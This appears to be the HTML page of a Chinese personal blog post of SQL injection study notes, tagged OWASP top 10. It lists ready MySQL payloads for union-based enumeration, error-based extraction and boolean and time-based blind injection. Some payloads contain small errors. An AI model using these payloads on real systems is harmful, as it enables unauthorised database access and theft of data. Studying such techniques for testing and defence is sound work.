@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SQL注入的基本步骤 先判断注入点 有回显 or 无回显 判断字段数 查库名（如果不打算获取其他数据库的数据，可以跳过） 查表名 查具体数据  常规注入姿势联合查询查询库名union select 1,group_concat(schema_name),3 from information_schema.schemata–+ 查询表名union select 1,group_concat(tabl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="想逃避现实的芝麻糊">
+<meta property="og:description" content="SQL注入的基本步骤 先判断注入点 有回显 or 无回显 判断字段数 查库名（如果不打算获取其他数据库的数据，可以跳过） 查表名 查具体数据  常规注入姿势联合查询查询库名union select 1,group_concat(schema_name),3 from information_schema.schemata–+ 查询表名union select 1,group_concat(tabl">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-04-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-01-22T11:31:08.328Z">
+<meta property="article:author" content="芝麻糊">
+<meta property="article:tag" content="OWASP top 10">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.ico" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.ico">
+        
+      
+    
+    <!-- title -->
+    <title>SQL注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/08/17/2021-08-17-XXE/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&text=SQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入&body=Check out this article: http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&name=SQL注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&t=SQL注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.</span> <span class="toc-text">SQL注入的基本步骤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.</span> <span class="toc-text">常规注入姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.1.</span> <span class="toc-text">联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D"><span class="toc-number">2.1.1.</span> <span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-number">2.1.2.</span> <span class="toc-text">查询表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">查询字段名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.2.2.</span> <span class="toc-text">各种姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rand-group-by-conut-%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">rand()+group by+conut()组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">2.2.2.3.0.1.</span> <span class="toc-text">背景知识</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uuid%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">uuid相关函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E9%95%BF%E5%BA%A6"><span class="toc-number">2.3.1.</span> <span class="toc-text">猜长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E5%85%B7%E4%BD%93%E6%95%B0%E6%8D%AE"><span class="toc-number">2.3.2.</span> <span class="toc-text">猜具体数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.4.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E9%95%BF%E5%BA%A6-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">猜长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E5%85%B7%E4%BD%93%E6%95%B0%E6%8D%AE-1"><span class="toc-number">2.4.2.</span> <span class="toc-text">猜具体数据</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SQL注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">c-uncle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-08T16:00:00.000Z" itemprop="datePublished">2021-04-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/OWASP-top-10/" rel="tag">OWASP top 10</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="SQL注入的基本步骤"><a href="#SQL注入的基本步骤" class="headerlink" title="SQL注入的基本步骤"></a>SQL注入的基本步骤</h1><ol>
+<li>先判断注入点</li>
+<li>有回显 or 无回显</li>
+<li>判断字段数</li>
+<li>查库名（如果不打算获取其他数据库的数据，可以跳过）</li>
+<li>查表名</li>
+<li>查具体数据</li>
+</ol>
+<h1 id="常规注入姿势"><a href="#常规注入姿势" class="headerlink" title="常规注入姿势"></a>常规注入姿势</h1><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h3><p>union select 1,group_concat(schema_name),3 from information_schema.schemata–+</p>
+<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()–+</p>
+<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p> union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=’xxx’–+</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用mysql的逻辑错误，使程序返回带有数据的错误信息。</p>
+<h3 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>payload：updatexml(1,concat(0x7e,(select user()),0x7e),1)</p>
+<p>updatexml有字符数限制，最多显示32位，需要根据实际情况，结合length和substring来获取数据</p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>payload：extractvalue(1,concat(0x7e,(select user()),0x7e))</p>
+<p>和updatexml一样有字符数限制。</p>
+<h4 id="rand-group-by-conut-组合拳"><a href="#rand-group-by-conut-组合拳" class="headerlink" title="rand()+group by+conut()组合拳"></a>rand()+group by+conut()组合拳</h4><p><strong>注意：这套组合拳在mysql8.0下无效</strong></p>
+<p>这套组合拳的原里是利用虚拟表无法重复写入同一个键名来报错。</p>
+<hr>
+<h6 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h6><p><strong>group by</strong> 可以对一个列或多个列进行分组。</p>
+<p>group by 的虚拟表工作步骤：</p>
+<ol>
+<li>确定分组因子</li>
+<li>分组因子在虚拟表中没有记录，添加记录</li>
+<li>有记录，更新记录</li>
+</ol>
+<p><strong>rand(0)</strong>  可以随机生成0-1之间的实数，floor(rand(0)*2)确保了生成的值只可能是0或1。</p>
+<p>同时，rand是有规律的，floor(rand(0)*2)生成的值会是011011循环。</p>
+<hr>
+<p>程序在使用 <strong>group by</strong> 时会创建一个虚拟表来统计列出现的次数。</p>
+<p>这个虚拟表是不允许重复写入同一个键的。</p>
+<p>以 <strong>select * from user group by floor(rand(0)*2)</strong> 为例。</p>
+<p>程序会将select * from user的查询结果按floor(rand(0)*2)分组。</p>
+<p>假设user表中有三行数据。</p>
+<p>对于第一条数据，</p>
+<p>当group by 被执行时，需要先确定分组因子，也就是要先执行一次floor(rand(0)*2)（第一次执行，结果为0）。</p>
+<p>同时，程序遍历虚拟表，发现没有0，那么就会去添加键值为0的记录。</p>
+<p>但是，程序在添加记录时，会再次执行floor(rand(0)*2)（第二次执行，结果为1），导致添加到虚拟表里的记录是键值为1的记录。</p>
+<p>对于第二条数据，floor(rand(0)*2)第三次执行，结果为1，所以虚拟表会更新键值为1的记录。</p>
+<p>对于第三条数据，floor(rand(0)*2)第四次执行，结果为0，键值为0的记录不存在，于是准备添加记录。然而在添加时，floor(rand(0)*2)第五次执行，结果为1。于是就变成要添加键值为1的记录。可是1的记录已经存在了，这时候就报错了。</p>
+<p><strong>注意：一定要是rand(0)</strong></p>
+<p>payload：union select count(*), concat(‘:’, (select group_concat(schema_name) from information_schema.schemata),’:’, floor(rand(0)*2)) as a,3 from information_schema.schemata group by a–+</p>
+<p>用上面的payload演变出来的payload查具体数据是拿不到数据的，用来查表名，查字段名都正常。</p>
+<p>查具体数据的payload：payload:id=1” union select count(*), concat(‘:’, (select concat(email_id, ‘:’, id) from emails limit 1,1),’:’, floor(rand(0)*2)) as a,3 from information_schema.schemata group by a–+</p>
+<h4 id="uuid相关函数"><a href="#uuid相关函数" class="headerlink" title="uuid相关函数"></a>uuid相关函数</h4><p>payload:  1234’ union SELECT 1, UUID_TO_BIN((select database()))#</p>
+<p>可用于mysql8.0</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>如果程序对于sql语句的不同执行结果，会返回不同的响应。利用这个特点，我们可以结合逻辑运算和len，substring，来猜测数据。</p>
+<p>当sql语句执行结果永真或永假时，显示的页面是不同的，我们就可以使用盲注。</p>
+<h3 id="猜长度"><a href="#猜长度" class="headerlink" title="猜长度"></a>猜长度</h3><p>payload: id=1’ and len(select user())=<strong>1</strong>–+</p>
+<h3 id="猜具体数据"><a href="#猜具体数据" class="headerlink" title="猜具体数据"></a>猜具体数据</h3><p>payload: id=1’ and  substring((select user()), <strong>1</strong>,1) =’<strong>a</strong>‘–+</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>当sql语句执行结果永真或永假时，响应是一样的。这时不能使用布尔盲注。</p>
+<p>但是利用if语句和sleep函数，但if条件成立，sleep执行，使得响应时间变长，利用这一特点来猜测数据。</p>
+<h3 id="猜长度-1"><a href="#猜长度-1" class="headerlink" title="猜长度"></a>猜长度</h3><p>payload: id=1’ and if(len(select user())=<strong>1</strong>, sleep(5), 0)–+</p>
+<h3 id="猜具体数据-1"><a href="#猜具体数据-1" class="headerlink" title="猜具体数据"></a>猜具体数据</h3><p>payload: id=1’ and  if(substring((select user()), <strong>1</strong>,1), sleep(5), 0) =’<strong>a</strong>‘–+</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.</span> <span class="toc-text">SQL注入的基本步骤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.</span> <span class="toc-text">常规注入姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.1.</span> <span class="toc-text">联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D"><span class="toc-number">2.1.1.</span> <span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-number">2.1.2.</span> <span class="toc-text">查询表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">查询字段名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.2.2.</span> <span class="toc-text">各种姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rand-group-by-conut-%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">rand()+group by+conut()组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">2.2.2.3.0.1.</span> <span class="toc-text">背景知识</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uuid%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">uuid相关函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E9%95%BF%E5%BA%A6"><span class="toc-number">2.3.1.</span> <span class="toc-text">猜长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E5%85%B7%E4%BD%93%E6%95%B0%E6%8D%AE"><span class="toc-number">2.3.2.</span> <span class="toc-text">猜具体数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.4.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E9%95%BF%E5%BA%A6-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">猜长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E5%85%B7%E4%BD%93%E6%95%B0%E6%8D%AE-1"><span class="toc-number">2.4.2.</span> <span class="toc-text">猜具体数据</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&text=SQL注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入&body=Check out this article: http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&name=SQL注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/&t=SQL注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    芝麻糊
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
